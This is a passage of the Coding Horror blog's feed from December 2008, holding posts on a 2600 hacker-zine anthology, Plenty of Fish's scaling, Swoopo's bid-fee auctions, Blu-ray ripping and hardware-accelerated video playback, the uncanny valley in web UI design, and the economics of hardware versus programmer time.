<link>https://blog.codinghorror.com/our-hacker-odyssey/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Although I've never been more than a bush league hacker (at best), I was always fascinated with the tales from the infamous hacker zine <a href="http://en.wikipedia.org/wiki/2600_The_Hacker_Quarterly">2600</a>. I'd occasionally discover scanned issues in BBS ASCII archives, <a href="http://www.textfiles.com/hacking/2600-9-3.txt">like this one</a>, and spend hours puzzling over the techniques and information it contained.</p>
<p>I was excited to learn that a 2600 compilation was released earlier this year: <a href="http://www.amazon.com/dp/0470294191/?tag=codihorr-20">The Best of 2600: A Hacker Odyssey</a>. Although a lot of the information is hopelessly out of date and/or obsolete now, there's <a href="http://www.codinghorror.com/blog/archives/000852.html">a timeless quality to the social engineering techniques</a>, and at its core, the best articles are just <strong>plain good storytelling combined with technical writing skills</strong>.</p>
<p>The introduction captures, I think, the essence of 2600 – the adventures of young adults experimenting with computers.</p>
<blockquote>One of the true joys of the hacker world is the wealth of firsthand accounts that get shared throughout the community. Everyone has a story and many hackers have a whole treasure trove of them. This is what comes from being an inquisitive bunch with a tendency to probe and explore, all the while asking entirely too many questions. The rest of the world simply wasn't prepared for this sort of thing, a fact that hackers used to their advantage time and again.
<p><a href="http://www.amazon.com/dp/0470294191/?tag=codihorr-20"><img alt="image placeholder" >
<p>In the hacker world, you can have adventures and obtain information on a whole variety of levels, using such methods as social engineering, trashing, or simply communicating and meeting up with each other. All of these methods continue to work to this day. Back in the 1980s, excitement via a keyboard was a fairly new concept but it was catching on pretty fast as personal computers started to become commonplace. It seemed incredible (and still does to me) that you could simply stick your telephone into an acoustic modem, type a few letters on a keyboard, and somehow be communicating with someone in an entirely different part of the country or even another part of the globe.</p>
<p>Of course, hackers had already been having all sorts of adventures on telephones for years before this, whether it was through boxing, teleconferencing, or just randomly calling people. And there were the occasional "real-life" adventures, something hackers were certainly not averse to, contrary to the usual stereotypes of pasty-faced teenagers who feared going outside and interacting with the world. The point is that whenever you got a bunch of bored, curious, and daring individuals together, it didn't really matter what the setting was. On the screen, over the phone, or in real life, there was fun to be had and plenty to be learned in the process.</p>
</blockquote>
<p>The <a href="http://www.2600.com/">mighty 2600 empire</a> soldiers on, of course – the latest issue is <a href="http://store.2600.com/autumn2008.html">Autumn 2008</a>. This handpicked best of collection works as both historical archive and introduction. It's a great starting point, and a book I continue to take with me on trips for background reading. It rarely disappoints.</p>
<p>If you believe, like I do, in the value of <a href="http://www.codinghorror.com/blog/archives/000569.html">learning through cartoons</a>, then Ed Piskor's Wizzywig graphic novels are excellent companion pieces to the 2600 compilation.</p>
<p><a href="http://www.edpiskor.com/volume2/10.html"><img alt="image placeholder" >
<p>So far there's <a href="http://www.edpiskor.com/hacker.html">Wizzywig Volume 1: Phreak</a> and <a href="http://www.edpiskor.com/hacker2.html">Wizzywig Volume 2: Hacker</a> and <a href="http://www.edpiskor.com/wizzy3.html">Wizzywig Volume 3: Fugitive</a>, with a fourth and <a href="http://www.amazon.com/dp/1603090975/?tag=codihorr-20">final book</a> on the way. You can <a href="http://t.co/PzcVgO4m">read the first two books completely free online</a>; if you like what you see, Ed sells all the books directly on <a href="http://www.edpiskor.com/store.html">his store</a>. It's a little eerie how accurately he captured the ambiance of that era for me, all those fumbling, exploratory sessions with nascent online community through <a href="http://www.codinghorror.com/blog/archives/000599.html">modems</a>, local bulletin boards, and user group meetings.</p>
<p>It's fun to revisit the origins of my hacker odyssey, but I feel like we're <a href="http://www.codinghorror.com/blog/archives/000718.html">nowhere near the end of it yet</a>.</p>
<p>How about you?</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-07T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/our-hacker-odyssey/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ My Scaling Hero ]]></title>
<link>https://blog.codinghorror.com/my-scaling-hero/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Inspiration for <a href="http://stackoverflow.com/">Stack Overflow</a> occasionally comes from the unlikeliest places. Have you ever heard of <a href="http://www.nytimes.com/2008/01/13/business/13digi.html?ex=1357966800&amp;en=bfde0f1a6ec77632&amp;ei=5090&amp;partner=rssuserland&amp;emc=rss&amp;pagewanted=all">the dating website, Plenty of Fish?</a>
</p>
<blockquote>
<b>Markus Frind built the Plenty of Fish Web site in 2003 as nothing more than an exercise to help teach himself a new programming language, ASP.NET.</b> The site first became popular among English-speaking Canadians. Popularity among online daters in many United States cities followed more recently, and with minimal spending on advertising the site. According to data from comScore Media Metrix for November 2007, Plenty of Fish had 1.4 million unique visitors in the United States. In December, Mr. Frind said, the site served up 1.2 billion page views, and page views have soared 20 percent since Dec. 26.
</blockquote>
<p>
The actual <a href="http://www.plentyoffish.com/">plentyoffish.com</a> site design, although it has improved (believe it or not) since the last time I looked, is almost horrifyingly bad; it literally looks like a high school student's first website programming attempt. But <i>it doesn't matter</i>. The site is a resounding success with users, to the point that it is almost completely user-run:
</p>
<p>
</p>
<blockquote>
No one heads to Plenty of Fish for the customer service, which is all but nonexistent. The company does not need a support structure to handle members' subscription and billing issues because the service is entirely advertising-based. Its tagline is: "100 percent free. Put away your credit card." For hand-holding, users must rely on fellow members, whose advice is found in online forums. The Dating &amp; Love Advice category lists more than 320,000 posts, making up in sheer quantity what it lacks in a soothing live presence available by phone.
</blockquote>
<p>
Granted, comparing a dating site to other online properties is kind of unfair. As I mentioned in <a href="http://www.codinghorror.com/blog/archives/000579.html">an earlier post</a>, the most sustainible and enduring business models either get you laid, or get you paid -- and the more directly the better. Jamie Zawinski's classic <a href="http://www.jwz.org/doc/groupware.html">Groupware Bad</a> article covers the same ground:
</p>
<p>
</p>
<blockquote>
So I said, narrow the focus. Your "use case" should be, there's a 22 year old college student living in the dorms. How will this software get him laid?
</blockquote>
<p>
It's pretty clear which axis of human needs Plenty of Fish tends to. It's already working with <a href="http://www.codinghorror.com/blog/archives/000127.html">way more cheese</a> than most software developers will ever have.
</p>
<p>
OK, so Markus Frind singlehandedly built a massively popular free dating site that is almost entirely community run. Big deal. But what makes it <i>especially</i> incredible is that he <a href="http://highscalability.com/plentyoffish-architecture">does it all on a handful of servers</a>:
</p>
<p>
</p>
<blockquote>
<ul>
<li>1.2 billion page views per month, 500,000 average unique logins per day
</li>
<li>30+ million hits per day, 500-600 per second
</li>
<li>45 million visitors per month
</li>
<li>top 30 site in the US, top 10 in Canada, top 30 in the UK
</li>
<li>2 load balanced Windows Server 2003 x64 web servers with 2 Quad Core 2.66Ghz CPUs, 8 GB RAM, 2 hard drives
</li>
<li>3 database servers. No data on their configuration
</li>
<li>Approaching 64,000 simultaneous connections and 2 million page views per hour
</li>
<li>Internet connection is a 1 Gbps line, 200 Mbps is used
</li>
<li>1 TB per day serving 171 million images through Akamai
</li>
<li>6 TB storage array to handle millions of full sized images uploaded every month to the site
</li>
</ul>
</blockquote>
<p>
These traffic and size numbers are nothing short of astonishing. <b>He's accomplished all this on his own, using only five servers with the same Microsoft and ASP.NET stack we use</b>. This gives me great hope for scaling Stack Overflow without needing a lot of employees or server hardware. I'm not sure we'll ever reach those kinds of traffic levels.
</p>
<p>
That said, there are some dark clouds on the horizon; in a recent blog post, Markus noted that <a href="http://plentyoffish.wordpress.com/2008/11/13/monetization-free-verse-paid/">their free business model doesn't always scale as well as the hardware</a>:
</p>
<p>
</p>
<blockquote>
The problem with free is that every time you double the size of your database the cost of maintaining the site grows 6 fold. I really underestimated how much resources it would take, I have one database table now that exceeds  3 billion records. The bigger you get as a free site the less money you make per visit and the more it costs to service a visit.
</blockquote>
<p>
Of course, any resemblance between a free dating site and a question-and-answer site for programmers is <a href="http://www.codinghorror.com/blog/archives/000586.html">purely coincidental</a>, I'm sure.
</p>
<p>
</p>
<blockquote>
In the early years of programming, a program was regarded as the private property of the programmer. One would no more think of reading a colleague's program unbidden than of picking up a love letter and reading it. <b>This is essentially what a program was, a love letter from the programmer to the hardware, full of the intimate details known only to partners in an affair.</b> Consequently, programs became larded with the pet names and verbal shorthand so popular with lovers who live in the blissful abstraction that assumes that theirs is the only existence in the universe. Such programs are unintelligible to those outside the partnership.
</blockquote>
<p>
Maybe Stack Overflow is also built on <a href="http://www.youtube.com/watch?v=Xe1TZaElTAs">love, internet style</a>. Here's hoping that scales as well as Plenty of Fish has.
</p>
<p>
<font color="red">Update:</font> Markus notes that according to hitwise, as of 2008, he runs the <a href="http://plentyoffish.wordpress.com/2008/12/20/2008-was-a-good-year-now-13-in-the-us/">#13 website in the United States</a>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-10T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/my-scaling-hero/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Profitable Until Deemed Illegal ]]></title>
<link>https://blog.codinghorror.com/profitable-until-deemed-illegal/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I was fascinated to discover the auction hybrid site <a href="http://en.wikipedia.org/wiki/Swoopo">swoopo.com</a> (previously known as telebid.com). It's a strange combination of eBay, woot, and slot machine. Here's <a href="http://www.swoopo.com/new.html" rel="nofollow">how it works</a>:
</p>
<p>
</p>
<ul>
<li>You purchase bids in pre-packaged blocks of at least 30. Each bid costs you 75 cents, with no volume discount.
</li>
<li>Each bid raises the purchase price by 15 cents and increases the auction time by 15 seconds.
</li>
<li>Once the auction ends, you pay the final price.
</li>
</ul>
<p>
I just watched an 8GB Apple iPod Touch sell on swoopo for <b>$187.65</b>. The final price means a total of 1,251 bids were placed for this item, costing bidders a grand total of <b>$938.25</b>.
</p>
<p>
So that $229 item ultimately sold for $1,125.90.
</p>
<p>
But that one final bidder got a great deal, right? Maybe. Even when you win, you can lose. Remember that each bid costs you 75 cents, while only increasing the price of the item 15 cents. If you bid too many times on an item -- or if you use the site's "helpful" <a href="http://www.swoopo.com/bidbutlerhelp.html" rel="nofollow">automated BidButler service</a>, which bids on your behalf -- you'll end up paying the purchase price in bids alone. For this item, if you bid more than 305 times, you've paid the purchase price -- and only raised the cost of the item by $45.75 total.
</p>
<p>
OK, so bidding a lot is a bad idea, so maybe we only bid one time, or a few times, and near the end of the auction? Great plan, except <b>the auction is extended 15 seconds each and every time someone bids in those final seconds</b>. There are absolute end dates for the auctions, but they're usually so far in the future that the auction will end through attrition long before they reach their end date. I've often wondered if eBay would implement this feature, as it would effectively end last second sniping, a huge problem for auction sites. Well, beyond the obvious problem with auctions, which is that the most <i>optimistic</i> person sets the price for everyone else.
</p>
<p>
There's something else at work here, though, and it's almost an exploit of human nature itself. Once you've bid on something a few times, you now have a vested financial interest in that product, a product <i>someone else could end up winning</i>, rendering your investment moot. This often leads to irrational decisionmaking -- something called the <a href="http://en.wikipedia.org/wiki/Endowment_effect">endowment effect</a>, which has <a href="http://www.livescience.com/animals/071008-chimp-endowment.html">even been observed in chimpanzees</a>. So instead of doing the rational thing and walking away from a bad investment, you pour more money in, sending good money after bad.
</p>
<p>
It's pretty clear to me that <b>swoopo isn't an auction site</b>. It bills itself as "entertainment shopping". I think it is in fact a lottery; the only way to win here is sheer dumb luck.
</p>
<p>
Or, of course, by <a href="http://www.imdb.com/title/tt0086567/quotes#qt0453844">not playing at all</a>.
</p>
<p>
<a href="http://www.imdb.com/title/tt0086567/quotes#qt0453844"><img alt="image placeholder" >
</p>
<p>
But wait -- it gets worse! Swoopo also offers
</p>
<p>
</p>
<ul>
<li>
<b>Penny auctions</b>, where each bid only increases the price of the final item by 1 cent, while still costing you 75 cents.
</li>
<li>
<b>FreeBids auctions</b>, where the item up for grabs is Swoopo bids. Near as I can tell, this is swoopo printing their own money.
</li>
<li>
<b>100% off auctions</b>, where the "winner" (and I use this term loosely) pays nothing for the final item, regardless of what the final price is bid up to. Imagine the bidding frenzy on this one at 75 cents a pop.
</li>
<li>
<b>Cash auctions</b>, where you win actual real money at the end. It's like they're not even trying to <i>pretend</i> they don't run a gambling site with these.
</li>
</ul>
<p>
It's not clear that Swoopo even has the items they auction; they appear to sell first, then use the money they gain from the completed auction to buy and ship the item. Furthermore, they have a clause in their Help under Delivery and Shipping that lets them ship "equivalent" items:
</p>
<p>
</p>
<blockquote>
On rare occasions we are no longer able to source the specific item detailed in the auction. When this happens, we will contact you and offer to send you an equivalent item of at least equal value. Many of the products we sell are high-technology items that have a short life-cycle, so often this will mean an upgrade to the newer version of the item.
</blockquote>
<p>
There are also rumblings that swoopo silently pits users from the different territory websites against each other in individual auctions, such that UK users are unwittingly bidding against US users. This is done to ensure that there is around the clock bidding to extend auction end dates as long as possible.
</p>
<p>
In short, <b>swoopo is about as close to pure, distilled evil in a business plan as I've ever seen.</b>  They get paid for everything up front, and as they drop ship everything there's no inventory or overhead to worry about. It is almost <i>brilliantly</i> evil, in a sort of evil genius way. You can't stop people from endowment effect fueled bidding when they have the individual chance, however small it may be, to win a $2,000 television for $80 -- while collectively sending the house $10,000 or more.
</p>
<p>
My admiration stops short of sites that prey on the weak and the uneducated -- and of business plans that are <b>almost <i>certainly</i> illegal</b>, at least here in the US.
</p>
<p>
As always, <a href="http://en.wikipedia.org/wiki/Caveat_emptor">caveat emptor</a>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-11T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/profitable-until-deemed-illegal/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Easy, Efficient Hi-Def Video Playback ]]></title>
<link>https://blog.codinghorror.com/easy-efficient-hi-def-video-playback/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Ever since creating <a href="http://www.codinghorror.com/blog/archives/001107.html">my first home theater PC</a>, I've archived my Netflix rental DVDs to files on the hard drive. I don't do this because I want to rip off the movie industry; I do it for convenience. <b>It's easier to deal with a collection of digital files than it is to deal with a bunch of shiny, easily scratched plastic discs.</b> Nor do I keep the movies around after I watch them. I already own more movies than I could possibly ever watch in one lifetime. As I get older, my desire to collect things is rapidly diminishing. My ripping is purely about simplicity and ease of use for me, the consumer.
</p>
<p>
After years archiving DVDs on my home theater PC, I was concerned that <a href="http://www.codinghorror.com/blog/archives/001193.html">the dawning Blu-Ray era</a> would make this impossible. Fortunately, that's not the case. I experimented with <a href="http://www.slysoft.com/en/anydvdhd.html">AnyDVD HD</a> and my first batch of rented Netflix Blu-Ray discs:
</p>
<p>
</p>
<ol>
<li>Right click the SlySoft task bar icon; choose "Rip Video DVD to Harddisk"
</li>
<li>Choose a path (it will create a subfolder)
</li>
<li>Make sure you have at least 50 GB of free disk space
</li>
<li>Click "Copy DVD"
</li>
</ol>
<p>
So brainlessly easy, even <i>I</i> can do it.
</p>
<p>
You'll end up with a folder containing all the subfolders and files that make up the Blu-Ray title. I'm not terribly interested in extras and so forth (did I mention that I don't have time?), I just want the movie itself. It's not hard to find. The movie file is in the folder:
</p>
<p>
</p>
<pre>
/BDMV/STREAM/*.m2ts
</pre>
<p>
Sort by file size, identify the biggest file, and that's your movie. Some movies are broken up into multiple files, but most of the ones I've done so far have been one giant honking file, somewhere between 8 and 20+ gigabytes in size. <b>Rename and copy that one giant m2ts file</b> wherever you want it, then delete all the other files.
</p>
<p>
Let's look at <a href="http://www.amazon.com/dp/B0013ND36G/?tag=codihorr-20">Terminator 3</a> as a specific example. (Digression: I don't understand why this movie gets such a bad rap. Sure, it's not a landmark film like T1 or T2, but it's a solid entry in the franchise, at least in my opinion.) Blu-Ray encompasses <a href="http://en.wikipedia.org/wiki/Blu-ray_Disc#Codecs">multiple video and audio encoding formats</a>, so we need to crack open the file and see what's inside. I recommend using the <a href="http://mediainfo.sourceforge.net/en">most excellent MediaInfo application</a> for this.
</p>
<p>
</p>
<pre>
<b>General</b>
Complete name                    : terminator3.m2ts
Format                           : BDAV
Format/Info                      : BluRay Video
File size                        : 13.0 GiB
Duration                         : 1h 49mn
Overall bit rate                 : 17.1 Mbps
Maximum Overall bit rate         : 48.0 Mbps
<p>
<b>Video</b>
Format                           : VC-1
Format profile                   : AP@L3
Duration                         : 1h 48mn
Bit rate                         : 13.9 Mbps
Width                            : 1920 pixels
Height                           : 1080 pixels
Display aspect ratio             : 16/9
Frame rate                       : 23.976 fps
Colorimetry                      : 4:2:0
Scan type                        : Progressive
Bits/(Pixel*Frame)               : 0.280
</p><p>
<b>Audio</b> (1 of 6)
Format                           : AC-3
Format/Info                      : Audio Coding 3
Duration                         : 1h 49mn
Bit rate mode                    : Constant
Bit rate                         : 640 Kbps
Channel(s)                       : 6 channels
Channel positions                : Front: L C R, Surround: L R, LFE
Sampling rate                    : 48.0 KHz
</p></pre>
<p>
I've clipped a lot of the extraneous information away, but the most important parts here are the encodings:
</p>
<p>
</p>
<ul>
<li>Video is <a href="http://en.wikipedia.org/wiki/VC-1">VC-1</a>, 1920 x 1080, 13.9 Mbps average
</li>
<li>Audio is <a href="http://en.wikipedia.org/wiki/Dolby_Digital">Dolby Digital AC-3</a>, 6 channel, 640 Kbps
</li>
</ul>
<p>
The ripping part has been straightforward; what I haven't been able to understand is why <b>playback of 1920 x 1080 high definition files is so spotty</b> on <a href="http://www.codinghorror.com/blog/archives/001107.html">my current home theater PC</a>:
</p>
<p>
</p>
<ol>
<li>
<a href="http://www.kqzyfj.com/click-2338938-10440897?url=http%3A%2F%2Fwww.newegg.com%2FProduct%2FProduct.aspx%3FItem%3DN82E16813128341%26nm_mc%3DAFC-C8Junction%26cm_mmc%3DAFC-C8Junction-_-Motherboards%2B-%2BAMD-_-GIGABYTE-_-13128341&amp;cjsku=N82E16813128341">Gigabyte GA-MA78GPM-DS2H Micro ATX</a> motherboard (<i>highly</i> recommended)
</li>
<li>AMD Athlon X2 4050e 2.1 GHz
</li>
<li>Windows Vista 32-bit SP1
</li>
<li>
<a href="http://www.free-codecs.com/download/FFDshow.htm">ffdshow all-in-one codec pack</a>
</li>
</ol>
<p>
Everything I've read led me to believe that <b>any modern reasonably fast dual-core CPU is more than enough for high definition video playback</b>. While that's <i>generally</i> true, some files are tougher than others. For example, taking advantage of <a href="http://www.codinghorror.com/blog/archives/001193.html">my new multi-format drive</a>, I picked up a cheap copy of the now-obsolete HD-DVD edition of <a href="http://www.amazon.com/dp/B000MRAAJM/?tag=codihorr-20">Planet Earth - The Complete BBC Series</a>. (Which is amazing, by the way -- it's probably the ultimate high definition demo disc, and the shows are fascinating to boot.) These files are also encoded with VC-1 but at a somewhat higher bitrate than Terminator 3.
</p>
<p>
Unfortunately, on a dual core Athlon -- even overclocked to 2.3 GHz -- the Planet Earth rips are on the ragged edge of playability under Windows Media Player. CPU usage is well north of 80% all the time, and some peaks at 100% mean video stuttering and sound breakup at least a few times in each episode. This is unacceptable.
</p>
<p>
After a great deal of research, I found <a href="http://mpc-hc.sourceforge.net/">Media Player Classic Home Cinema</a>. The big deal here is two things:
</p>
<p>
</p>
<ol>
<li>All codecs are "burned into" the Media Player Classic executable, so there's do dependency on whatever random codecs your PC happens to have installed (eg, ffdshow, cccp, Ivan's Krazy Elite Kodek Pak, etc).<br><br>
</li>
<li>It supports <a href="http://mpc-hc.sourceforge.net/DXVASupport.html">offloading video decoding duties to modern video cards</a>. This is limited to recent Radeon HD models and nVidia 8 and 9 series. Fortunately, my HTPC motherboard includes an embedded Radeon HD 3200 -- and since I blew up my old one (it's a long story) the new version I just installed includes 128 megabytes of dedicated DDR3 video memory, too.
</li>
</ol>
<p>
Now, remember that Terminator 3 is encoded with VC-1, effectively a Microsoft video codec. Windows Media Player supports this natively. You'd expect it to perform great, since it's baked into the operating system, right?
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Wrong. This isn't terrible performance, per se, but watch what happens when we play this same file using <a href="http://mpc-hc.sourceforge.net/">Media Player Classic Home Cinema</a>, with hardware accelerated decoding enabled:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Holy cow. <b>Using video hardware acceleration, we went from 75% CPU usage to 30% CPU usage</b>. That's incredible. I knew modern video cards could <i>assist</i> in decoding high definition video, but I had no idea the difference was this profound.
</p>
<p>
But I want to play my movie files in <a href="http://www.codinghorror.com/blog/archives/000784.html">Windows Vista Media Center</a>, not a weird little standalone app. Here's the most awesome part of this post: <i>you can!</i>
</p>
<p>
As I discovered buried in <a href="http://www.xpmediacentre.com.au/community/video-audio-cards-vista/27878-mkv-h-264-hardware-acceleration-dxva-4.html">an obscure forum post</a>, here's how:
</p>
<p>
</p>
<ol>
<li>
<a href="http://sourceforge.net/project/showfiles.php?group_id=170561">download the standalone MPC-HC filters</a>.
</li>
<li>Extract <code>MPCVideoDec.ax</code> and copy it into <code>c:windowssystem32</code>
</li>
<li>Open a command prompt, navigate to <code>c:windowssystem32</code>, and run <code>regsvr32 MPCVideoDec.ax</code>
</li>
</ol>
<p>
Be sure you don't have any other video codecs registered, as the MPC-HC filter can handle everything. <b>Once you register this magical codec, Windows Media Player (and thus, Windows Media Center) will use hardware accelerated high definition video playback</b>. It's amazing. How amazing? Those Planet Earth rips, which used to take 80-100% of a mainstream dual core CPU, barely take 40% when using the hardware accelerated MPC-HC filters.
</p>
<p>
There is one caveat: for some reason, the MPC-HC filter doesn't accelerate the H.264 Blu-Ray encoding format out of the box. But it can, though. You'll need to use something like the <a href="http://www.free-codecs.com/download/RadLight_Filter_Manager.htm">Radlight Filter Manager</a> to fix this. After launching it, navigate to the DirectShow filters part of the tree, then look for "MPC - Video decoder", and click the Property Page button.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
On the Codecs tab, the only format not ticked for me was H.264/AVC. Tick that box and you're covered. You now have <b>fully hardware accelerated playback for every possible Blu-Ray video encoding format.</b> For free!
</p>
<p>
In my earlier attempts to solve this high definition video playback problem, I bought a copy of <a href="http://www.coreavc.com/">CoreAVC's "world's fastest H.264 software video decoder"</a>. And it was fast. Much faster than, say, the H.264 decoder included with ffdshow. My <a href="http://www.amazon.com/dp/B000MRA5NS/?tag=codihorr-20">Casino Royale</a> rip went from unplayable under ffdshow to eminently playable under CoreAVC, albeit at 80-90% CPU usage. I thought that was a great result until I saw the MPC-HC filter <b>play that very same Casino Royale file at around 25% CPU usage.</b> Zow. That's a night and day difference between "world's fastest" software and hardware accelerated H.264 decoding.
</p>
<p>
Now, if you have a <i>very</i> fast dual core CPU, or a moderately fast quad core CPU, you might be able to get away with pure software high definition video decoding (albeit at the cost of high CPU usage). But if, like me, you want to use a cheap, power-efficient dual core CPU to pull off high definition video playback, you'll need to properly harness the hardware decoding abilities of modern video cards. Media Player Classic Home Cinema is an excellent example of how this <i>should</i> work, and it's about the only one I could <i>get</i> to work.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-15T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/easy-efficient-hi-def-video-playback/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Avoiding The Uncanny Valley of User Interface ]]></title>
<link>https://blog.codinghorror.com/avoiding-the-uncanny-valley-of-user-interface/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Are you familiar with the <a href="http://en.wikipedia.org/wiki/Uncanny_valley">uncanny valley</a>?
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
No, not that uncanny valley. Well, on second thought, yes, <a href="http://www.slate.com/id/2102086">that uncanny valley</a>.
</p>
<p>
</p>
<blockquote>
In 1978, the Japanese roboticist Masahiro Mori noticed something interesting: The more humanlike his robots became, the more people were attracted to them, but only up to a point. If an android become too realistic and lifelike, suddenly people were repelled and disgusted.
<p>
The problem, Mori realized, is in the nature of how we identify with robots. When an android, such as R2-D2 or C-3PO, barely looks human, we cut it a lot of slack. It seems cute. We don't care that it's only 50 percent humanlike. But when a robot becomes 99 percent lifelike-- so close that it's almost real-- we focus on the missing 1 percent. We notice the slightly slack skin, the absence of a truly human glitter in the eyes. The once-cute robot now looks like an animated corpse. Our warm feelings, which had been rising the more vivid the robot became, abruptly plunge downward. Mori called this plunge "the Uncanny Valley," the paradoxical point at which a simulation of life becomes so good it's bad.
</p>
</blockquote>
<p>
This phenomenon has also been <a href="http://snarkmarket.com/blog/snarkives/video_games/the_uncanny_valley/">noted in cartoons</a>.
</p>
<blockquote>
McCloud's book <a href="http://www.amazon.com/dp/006097625X/?tag=codihorr-20">Understanding Comics</a> was the first place I ran into a concept which is a sort of corollary to the Uncanny Valley. Call it Lake Empathy: If a character is very simple, more iconic than realistic, it's much easier for people to pour themselves into it -- to view it not as a third party, but instead as a personal avatar.
<p>
For example, you probably see more of yourself in the character to the left than in the characters to the right.
</p>
<p>
<img alt="image placeholder" >
</p>
</blockquote>
<p>
The seminal <a href="http://www.amazon.com/dp/006097625X/?tag=codihorr-20">Understanding Comics</a> was where I first encountered this concept, too. It's a sort of digital <a href="http://en.wikipedia.org/wiki/Zeno%27s_paradoxes">Zeno's Paradox</a>. The more accurate your digital representation of a person, the more visible the subtle imperfections become. This is why computer generated people in recent movies like <a href="http://www.imdb.com/title/tt0338348/">Polar Express</a> feel even more unnatural than the highly abstract people in 1995's <a href="http://www.imdb.com/title/tt0114709/">Toy Story</a>. (The current state of the art, at least by some accounts, is <a href="http://www.youtube.com/watch?v=bLiX5d3rC6o&amp;fmt=18">The Emily Project</a>. You be the judge.)
</p>
<p>
But does the uncanny valley effect apply to software user interfaces, too? <a href="http://billhiggins.us/weblog/2007/05/17/the-uncanny-valley-of-user-interface-design/">Bill Higgins thinks it does</a>.
</p>
<p>
</p>
<blockquote>
The problem is that our minds have a model of how humans should behave and the pseudo-humans, whether robotic or computer-generated images, don't quite fit this model, producing a sense of unease - in other words, we know that something's not right - even if we can't precisely articulate what's wrong.
<p>
There's a lesson here for software designers, and one that I've talked about recently -- we must ensure that we <b>design our applications to remain consistent with the environment in which our software runs</b>. In more concrete terms: a Windows application should look and feel like a Windows application, a Mac application should look and feel like a Mac application, and a web application should look and feel like a web application.
</p>
</blockquote>
<p>
Bill extends this to web applications: <b>a web app that apes the conventions of a desktop application is attempting to cross the uncanny valley of user interface design.</b> This is a bad idea for all the same reasons; the tiny flaws and imperfections of the simulation will be grossly magnified for users. Consider the Zimbra web-based email that Bill refers to.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
It's pretty obvious that their inspiration was Microsoft Outlook, a desktop application.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
In my experience, shoehorning desktop conventions into web applications rarely ends well. I was never able to articulate exactly why, but the uncanny valley theory goes a long way towards explaining it:
</p>
<p>
</p>
<blockquote>
If you're considering or actively building Ajax/RIA applications, you should consider the Uncanny Valley of user interface design. When you build a "desktop in the web browser"-style application, <b>you're violating users' unwritten expectations of how a web application should look and behave.</b> This choice may have significant negative impact on learnability, pleasantness of use, and adoption.
</blockquote>
<p>
As I've <a href="http://www.codinghorror.com/blog/archives/000815.html">mentioned</a> <a href="http://www.codinghorror.com/blog/archives/000883.html">before</a>, one of the great strengths of web applications is that they <i>aren't</i> bound by the crusty old conventions of desktop applications. They're free to do things differently -- and hopefully better. Web applications should <a href="http://www.codinghorror.com/blog/archives/000480.html">play to their strengths</a>, instead of attempting to clone desktop applications.
</p>
<p>
If you end up anywhere near the uncanny valley of user interface, <b>that sense of unease you feel is perfectly normal</b>. You're clearly in the wrong place.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-12-16T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/avoiding-the-uncanny-valley-of-user-interface/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Hardware is Cheap, Programmers are Expensive ]]></title>
<link>https://blog.codinghorror.com/hardware-is-cheap-programmers-are-expensive/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Given the <a href="http://blog.codinghorror.com/moores-law-in-practical-terms/">rapid advance of Moore's Law</a>, <b>when does it make sense to throw hardware at a programming problem?</b> As a general rule, I'd say almost <i>always</i>.</p>
<p>Consider the <a href="http://www.payscale.com/research/US/Job=Sr._Software_Engineer_%2F_Developer_%2F_Programmer/Salary">average programmer salary</a> here in the US:</p>
<img alt="image placeholder" >
<p>You probably have several of these programmer guys or gals on staff. I can't speak to how much your servers may cost, or how many of them you may need. Or, maybe you don't need any  –  perhaps all your code executes on your users' hardware, which is an entirely different scenario. Obviously, situations vary. But even the most rudimentary math will tell you that <b>it'd take a <i>massive</i> hardware outlay to equal the yearly costs of even a modest five person programming team.</b></p>
<p>For example, I just bought <a href="http://blog.stackoverflow.com/2008/12/server-hosting-rent-vs-buy/">two very powerful servers for Stack Overflow</a>. Even after accounting for a third backup server and spare hard drives for the RAID arrays, my total outlay is around $5,000. These servers, compared to the ones we're on now, offer:</p>
<ul>
<li>roughly 50% more CPU speed</li>
<li>2 to 6 times the memory capacity</li>
<li>almost twice the disk space (and it's a faster RAID 10 array)</li>
</ul>
<p>Under this new hardware regime, we can expect average page response times to improve by about half. All that for <i>less than one month</i> of an average programmer's salary.</p>
<p>I'd say that's a great deal. A no-brainer, even.</p>
<p>Incidentally, this is also why failing to outfit your (relatively) highly paid programmers with decent equipment as per the <a href="http://blog.codinghorror.com/the-programmers-bill-of-rights/">Programmer's Bill of Rights</a> is such a colossal mistake. If a one-time investment of $4,000 on each programmer makes them merely 5% more productive, you'll break even after the first year. Every year after that you've made a profit. Also, having programmers who believe that their employers actually <i>give a damn about them</i> is probably a good business strategy for companies that actually want to be around five or ten years from now.</p>
<p>Clearly, <b>hardware is cheap, and programmers are expensive</b>. Whenever you're provided an opportunity to leverage that imbalance, it would be incredibly foolish not to.</p>
